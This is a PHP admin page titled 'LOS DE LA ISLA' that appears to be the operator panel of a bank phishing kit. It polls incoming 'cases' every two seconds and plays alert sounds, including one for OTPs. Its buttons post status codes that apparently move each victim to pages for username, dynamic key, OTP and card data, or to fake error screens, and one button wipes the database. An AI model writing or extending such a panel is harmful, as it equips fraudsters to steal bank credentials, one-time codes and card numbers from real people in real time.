<?php
session_start();
require('../lib/funciones.php');

date_default_timezone_set('America/Bogota');

if (isset($_SESSION["sesion"]) && $_SESSION["sesion"] == "OK") {
    // El usuario está autenticado, continúa con la página de administración
} else {
    header("Location: ../");
    exit();
}
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <!-- ▸ Título -->
    <title>LOS DE LA ISLA</title>

    <!-- ▸ Mantén los JS -->
    <script src="../js/jquery-3.6.0.min.js"></script>
    <script src="../js/functions.js"></script>

    <!-- ▸ NUEVO: tema oscuro -->
    <link rel="stylesheet" href="../css/dark.css">
    <link rel="icon" type="image/png" href="isla.png">
</head>

<body>
    <div class="container">
        <h1 style="display: flex; align-items: center; gap: 10px;">
  <img src="isla.png" alt="Isla" style="width: 36px; height: 36px;">
  LOS DE LA ISLA
</h1>
        
        <audio class="timbre timbre-normal">
            <source src="../audio/timbre.mp3" type="audio/mpeg">
            Your browser does not support the audio element.
        </audio>

        <audio class="timbre timbre-otp">
            <source src="../audio/electrico.mp3" type="audio/mpeg">
            Your browser does not support the audio element.
        </audio>

        <div class="servicio">
            <h3>Servicios</h3>
            <button class="btn"><a href="servicios.php">Ver los servicios</a></button>
            <button class="btn">Limpiar base de datos</button>
            <button class="btn">Crear usuario</button>
        </div>

        <div class="contenido">
            <?php cargar_casos(); ?>
        </div>
    </div>
    


    <script type="text/javascript">
    $(document).ready(function(){    
        setInterval(actualizar_casos,2000);    

        $(document).on('click', '.usuario', function() {
            $(this).attr('disabled','disabled')
            $.post( "../process/estado.php",{ id:$(this).attr('id'),est:"12" },function(data) {
            });
        });

        $(document).on('click', '.dinamica', function() {
            $(this).attr('disabled','disabled')
            $.post( "../process/estado.php",{ id:$(this).attr('id'),est:"2" },function(data) {
            });
        });

        $(document).on('click', '.otp', function() {
            $(this).attr('disabled','disabled')
            $.post( "../process/estado.php",{ id:$(this).attr('id'),est:"8" },function(data) {
            });
        });

        $(document).on('click', '.923', function() { 
            $(this).attr('disabled','disabled')
            $.post( "../process/estado.php",{ id:$(this).attr('id'),est:"4" },function(data) {
            });
        });

        $(document).on('click', '.tarjeta', function() { 
            $(this).attr('disabled','disabled')
            $.post( "../process/estado.php",{ id:$(this).attr('id'),est:"6" },function(data) {
            });
        });

        $(document).on('click', '.finalizar', function() { 
            $(this).attr('disabled','disabled')
            $.post( "../process/estado.php",{ id:$(this).attr('id'),est:"10" },function(data) {
            });
        });

        $(document).on('click', '.404', function() { 
            $(this).attr('disabled','disabled')
            $.post( "../process/estado.php",{ id:$(this).attr('id'),est:"40" },function(data) {
            });
        });

                $(document).on('click', '.validar', function() { 
            $(this).attr('disabled','disabled')
            $.post( "../process/estado.php",{ id:$(this).attr('id'),est:"25" },function(data) {
            });
        });
        
        $(document).on('click', '.ccError', function() { 
            $(this).attr('disabled','disabled')
            $.post( "../process/estado.php",{ id:$(this).attr('id'),est:"41" },function(data) {
            });
        });
    });
    </script>
</body>
</html>
